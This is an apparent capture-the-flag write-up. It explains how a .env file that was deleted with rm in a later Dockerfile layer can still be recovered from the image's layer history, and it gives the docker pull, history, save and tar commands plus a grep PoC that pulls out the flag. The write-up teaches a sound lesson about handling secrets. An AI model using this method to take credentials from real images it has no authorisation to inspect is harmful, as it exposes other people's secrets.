# Vulnerability

Image layers are additive and immutable, meaning each Dockerfile instruction creates a new layer containing the changes made relative to the previous layer. Files and commands executed in one layer will independently be extractable from that layer.

In this case, in one layer an env file is copied into image and in a later image it gets removed using rm command. But this does not mean env is totaly removed and there would be no sign of it. rm command just makes env hidden in the final layer of image but in layers behind rm command, we can still find contents of env file.

so the vulnerability here is simply deleting a sensitive file in a later Dockerfile layer does not securely remove it from the image history. Sensitive files should not be copied into an image. Just using rm command will not remove env and it would be accessible from extracting image and finding the layer of env. 

# Extraction

1. Image Pull
```
sudo docker pull hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend
```

2. Inspect build history to find what commands executed in each layer
```
sudo docker history --no-trunc hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend
```

This revealed two layers:

```
RUN /bin/sh -c rm -f /app/.env # buildkit       0B
COPY .env.leaked /app/.env # buildkit           41B
```

The naming (.env.leaked) and the immediate deletion right after copying it in was a strong signal that this file was placed as a target then has been made "hidden" in the final image file system. A case of assuming deletion means total removal.

3. Export the image with docker save
```
sudo docker save hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend -o image.tar
```

4. Extract the image and locate the target layer
```
mkdir image
sudo tar -xf image.tar -C image
cd image/blobs/sha256/
```

brute forced on layers hashes and checked their contents till found one which blongs to env layer and found flag in it:
```
cat 8042ae393dc8b7301ef4f2544fad8f596e00d57db61ca968d11d2b3e2e49f586
```

# PoC

```
sudo docker pull hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend >/dev/null 2>&1
if [ ! -f image.tar ]; then
    sudo docker save hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend -o image.tar >/dev/null 2>&1
fi
mkdir image >/dev/null 2>&1
sudo tar -xf image.tar -C image >/dev/null 2>&1
cd image/blobs/sha256/
grep -a -oP 'HAMAMOOZ\{[^}]+\}' 8042ae393dc8b7301ef4f2544fad8f596e00d57db61ca968d11d2b3e2e49f586 2>/dev/null
```